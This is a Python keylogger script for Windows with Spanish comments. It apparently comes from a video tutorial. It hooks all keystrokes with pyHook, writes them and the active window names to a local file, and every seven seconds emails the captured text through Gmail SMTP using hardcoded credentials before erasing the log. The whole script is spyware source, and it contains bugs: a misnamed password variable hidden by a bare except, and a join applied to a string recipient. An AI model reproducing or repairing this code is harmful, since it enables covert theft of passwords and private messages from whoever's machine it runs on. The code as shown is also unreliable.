import pyHook, pythoncom, sys, logging, time, datetime

carpeta_destino= 'C:\\Users\\17-w81\\Desktop\\KeyloggerYT\\KeyloggerYT.txt'
segundos_espera = 7

timeout = time.time() + segundos_espera

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False

def EnviarEmail():
    with open (carpeta_destino, 'r') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        data = data.replace('Space', ' ')
        data = data.replace('\n', '\n\n')
        data = 'Mensaje capturado a las: ' + fecha + '\n' + data
        print (data)

        crearEmail('pruebaKeyloggerCB@gmail.com', 'prueba123', 'pruebakeyloggerCB@gmail.com', "Nueva captura:" +fecha, data)
        f.seek(0)
        f.truncate()

def crearEmail(user, passw, recep, subj, body):
    import smtplib

    mailuser = user
    mailPass = passw
    From = user
    To = recep
    Subject= subj
    Txt=body

    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)

    try:
        server=smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print('Correo enviado con éxito!!')

    except:
        print('Correo fallido :(')

def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format="%(message)s")

    print("WindowName:", event.WindowName)
    print('Window:', event.Window)

    print("Key:", event.Key)
    logging.log(18, event.Key)

    return True

# Crea un administrador de ganchos
hm = pyHook.HookManager()

# Registra el evento OnKeyboardEvent para que se ejecute cuando se presione una tecla
hm.KeyDown = OnKeyboardEvent

# Inicia el gancho del teclado
hm.HookKeyboard()

while True:
    # Comprueba si ha pasado el tiempo de espera
    if TimeOut():
        # Envía un correo electrónico
        EnviarEmail()

        # Reinicia el tiempo de espera
        timeout = time.time() + segundos_espera

    # Espera mensajes en la cola de eventos
    pythoncom.PumpWaitingMessages()
